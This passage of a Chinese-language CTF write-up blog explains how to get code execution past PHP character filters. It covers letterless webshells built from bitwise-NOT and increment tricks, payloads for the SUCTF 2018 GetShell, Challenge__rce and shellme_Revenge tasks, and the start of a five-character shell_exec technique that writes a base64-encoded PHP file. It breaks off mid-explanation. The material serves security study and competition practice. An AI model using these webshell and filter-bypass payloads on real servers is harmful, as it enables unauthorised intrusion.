<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(茫)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(冷)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(茫)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(拥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(暗)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(和)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(格)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(寂)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(永)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(欢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(竟)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><strong>一个小例题</strong></p>
<h3 id="SUCTF-2018-GetShell-无字母getshell"><a href="#SUCTF-2018-GetShell-无字母getshell" class="headerlink" title="[SUCTF 2018]GetShell(无字母getshell)"></a>[SUCTF 2018]GetShell(无字母getshell)</h3><p>给了一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从第六位开始检查文件内容，然后将内容放进黑名单里遍历</p>
<p>文件上传成功后将文件后缀改为<code>php</code>，上传一个一句话木马即可成功</p>
<p>fuzz发现只剩下<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code></p>
<p>因为没有数字，所以先构造数字以取索引</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]; </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>; </span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="comment">// 不相等返回0，构造索引0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="comment">// 相同返回1，构造索引1</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(茫)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(冷)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(茫)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(拥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(暗)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(和)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(格)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(寂)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(永)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(欢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(竟)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>注释去掉上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082245288.png" alt="image-20221008224501227"></p>
<p>Th1s_14_f14g里面是一个错误的flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019088.png" alt="在这里插入图片描述"></p>
<p>环境问题，读环境变量<code>env</code>可以读出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082019995.png" alt="在这里插入图片描述"></p>
<h2 id="php自增自减getshell"><a href="#php自增自减getshell" class="headerlink" title="php自增自减getshell"></a>php自增自减getshell</h2><p>php中通过自增自减可以构造字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"><span class="comment">//output: B</span></span><br></pre></td></tr></table></figure>

<p>意思是只要有一个字符，那么就可以通过自增自减构造出其他字符，问题就转化为了怎么获得这一个字符</p>
<p>php中强行拼接两个空数组或者强行拼接字符串和数组会将数组强行转换为字符串，返回字符串<code>Array</code></p>
<p>eg.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Challenge-rce"><a href="#Challenge-rce" class="headerlink" title="Challenge__rce"></a>Challenge__rce</h3><p>3个点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.空数组拼接构造字母&#x27;A&#x27;</span><br><span class="line">2.希腊字母缩减字符长度</span><br><span class="line">3.chr()函数构造字母</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rce=$_=([].[])[0];++$_;$γ=++$_;++$_;$β=++$_;++$_;$Φ=++$_;$_=($γ.++$_.$_=($_.[])[2]);$_=$&#123;_.$Φ.$β.$_(84)&#125;;$_[_]($_[1]);</span><br></pre></td></tr></table></figure>

<p>简单分析一下</p>
<p>难点是在于对参数长度的限制，由于过滤了所有字母，所以构造出一个可用字母是此题的关键</p>
<p>php中强行拼接两个空数组或者强行拼接字符串和数组会将数组强行转换为字符串，返回字符串<code>Array</code></p>
<p>eg.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(10) &quot;ArrayArray&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//output:string(5) &quot;Array&quot;</span></span><br></pre></td></tr></table></figure>

<p>由于此题过滤了引号，所以这里选择空数组拼空数组的方式</p>
<p>因为数字还在所以可以取索引，这样就拿到了字母<code>A</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[].[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//output:string(1) &quot;A&quot;</span></span><br></pre></td></tr></table></figure>

<p>有了字母，构造就简单了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>]; <span class="comment">//A</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line">$γ=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($γ); <span class="comment">//C</span></span><br><span class="line">++<span class="variable">$_</span>;$β=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($β); <span class="comment">//E</span></span><br><span class="line">++<span class="variable">$_</span>;$Φ=++<span class="variable">$_</span>;<span class="title function_ invoke__">var_dump</span>($Φ); <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=($γ.++<span class="variable">$_</span>.<span class="variable">$_</span>=(<span class="variable">$_</span>.[])[<span class="number">2</span>]);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">//CHr</span></span><br><span class="line"><span class="variable">$_</span>=$&#123;_.$Φ.$β.<span class="variable">$_</span>(<span class="number">84</span>)&#125;; <span class="comment">//chr(84)=T</span></span><br><span class="line"><span class="variable">$_</span>[_](<span class="variable">$_</span>[<span class="number">1</span>]); <span class="comment">//$_GET[_]($_GET[1]);</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210070002920.png" alt="image-20221007000232847"></p>
<h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><p>两点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.利用php数值溢出构造字母&#x27;N&#x27;</span><br><span class="line">2.passthru命令执行</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单分析一下</p>
<p>字母剩下了<code>C</code>,数字剩下了<code>0-3</code>，同样是利用自增自减</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>

<p>因为存在长度限制<code>strlen($ctfshow) &lt;= 107</code>，所以想利用自增自减一给一个拼接字母是不现实的，需要利用<code>C</code>构造字母表后面的字母</p>
<p>利用php中一些数学上的trick</p>
<p>在php中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.PHP认为结果是无限大时，输出：INF（Infinite） </span><br><span class="line">2.当一个数超出Infinite，输出: double(NAN)       //NAN =&gt; not a number</span><br></pre></td></tr></table></figure>

<p>而两个字母相除都会被认为是<code>NAN</code>，其中还包括<code>0/0=NAN</code></p>
<p>因为返回的NAN是double类型，想获得单个字符需要拼接一个字符上去，不然返回的是NULL</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(C/C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:NULL</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=(C/C.C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(1) &quot;N&quot;</span></span><br></pre></td></tr></table></figure>

<p>这样就拿到了<code>N</code>,剩下的就正常构造就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C;  <span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C</span>=++<span class="variable">$_</span>;  <span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C_</span>=++<span class="variable">$_</span>;  <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=(C/C.C)[<span class="number">0</span>];  <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>++; </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$C_</span>.<span class="variable">$C</span>.++<span class="variable">$_</span>;  <span class="comment">//$_GET</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_GET[_]($_GET[1])</span></span><br></pre></td></tr></table></figure>

<p>过滤了system，用<code>passthru</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071206732.png" alt="image-20221007120622652"></p>
<h1 id="有限字符下的RCE"><a href="#有限字符下的RCE" class="headerlink" title="有限字符下的RCE"></a>有限字符下的RCE</h1><p>在网鼎时遇到一个四字符rce的题目，当时没做出来，故在赛后复现时写下总结。</p>
<h2 id="Linux命令浅析"><a href="#Linux命令浅析" class="headerlink" title="Linux命令浅析"></a>Linux命令浅析</h2><p><strong>重定向符(&gt;&#x2F;&gt;&gt;)</strong></p>
<p><code>linux</code>中，重定向符<code>&gt;/&gt;&gt;</code>具有创建文件的功能，且在其前面可执行任意命令，然后将命令执行的结果写入到指定文件中</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254744.png" alt="image-20221008225412701"></p>
<p>其中<code>&gt;</code>命令会将原有文件内容覆盖,<code>&gt;&gt;</code>会将字符串添加到文件内容末尾，不会覆盖原有的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031778.png" alt="image-20220831115455419"></p>
<p><strong>sh执行命令</strong></p>
<p><code>linux</code>中<code>sh</code>命令会将文件中的内容当作命令来执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254293.png" alt="image-20221008225424251"></p>
<p><strong>ls [选项] [目录名]</strong></p>
<p><code>linux</code>中<code>ls</code>默认按照字母顺序排序，<code>-t</code>参数以文件修改时间排序，新创建的文件在前面，<code>-h</code>参数以易读的方式显示文件或目录大小，如 1KB、234MB、2GB 等。<code>-h</code>参数主要的作用是调整<code>-t</code>参数位置，下文以具体例子进行分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254083.png" alt="image-20221008225431045"></p>
<p><strong>星号(*)</strong></p>
<p><code>linux</code>中<code>*</code>可作为通配符使用，在输入<code>*</code>后，<code>linux</code>会将该目录下第一个文件名作为命令，剩下的的文件名当作参数</p>
<p>如下例子执行<code>*</code>即是相当于执行了<code>ls -t</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031785.png" alt="image-20220831121538955"></p>
<p><strong>反斜杠<code>\</code>实现命令换行</strong></p>
<p><code>linux</code>中，执行命令时，可以在没有写完的命令后面加<code>\</code>，实现将一条命令多行化，以行末没有<code>\</code>为终止</p>
<p>如下相当于执行了<code>cat flag.txt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254616.png" alt="image-20221008225446574"></p>
<p><strong>rev</strong></p>
<p><code>linux</code>中,利用<code>rev</code>可将文件内容倒置，同时可以配合<code>&gt;</code>,<code>*</code>使用</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254944.png" alt="image-20221008225453900"></p>
<p><strong>dir</strong></p>
<p><code>linux</code>中,<code>dir</code>命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，<code>ls</code>写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而<code>dir</code>会把内容全部写入一行中，同时会自动补全空格</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255621.png" alt="image-20221008225540577"></p>
<h2 id="五字符"><a href="#五字符" class="headerlink" title="五字符"></a>五字符</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">5</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>简单思路</strong></p>
<p>因为shell_exec能执行系统命令，所以将需要执行的命令拆分，以文件名的形式写入，还需要写一个文件用于存放<code>ls -th &gt;f</code>，然后通过执行这个文件，将文件名形式的命令写入到文件<code>f</code>中，最后执行<code>f</code>就相当于执行了命令</p>
<p>前面我们说到<code>ls -h</code>参数的使用，那么<code>-h</code>究竟有什么用呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-h参数以易读的方式显示文件或目录大小</span><br></pre></td></tr></table></figure>

<p>简单看个例子，目标是构造<code>ls -t &gt; a</code></p>
<p>那么应该依次执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>

<p>实际效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031698.png" alt="image-20220831231200664"></p>
<p>因为ls是默认按照字母顺序来排序的，所以添上-h是为了让命令以正常的顺序运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255810.png" alt="image-20221008225554771"></p>
<p>继续往下看，上面说到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</span><br></pre></td></tr></table></figure>

<p>如同这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082256154.png" alt="image-20221008225601111"></p>
<p>用ls的话就会影响到命令的执行，所以这里要用dir来代替ls</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        </span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a        </span><br><span class="line">sh a        最后用sh来执行命令</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031797.png" alt="image-20220831231137776"></p>
<p>接下来就可以开始拆分字符串了，第一种可以直接构造一句话木马,因为有<code>&lt;,?</code>，需要将其进行base64转换，这样payload里就没有特殊字符了，以phpinfo作为例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">构造</span><br><span class="line">echo PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>

<p>需要注意的是必须要将其中一个空格用<code>$&#123;IFS&#125;</code>代替，否则会被’吃’掉一个空格</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031976.png" alt="image-20220831142132429"></p>
<p>那么payload就应该转换为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">echo$&#123;IFS&#125;PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>

<p>拆分</p>
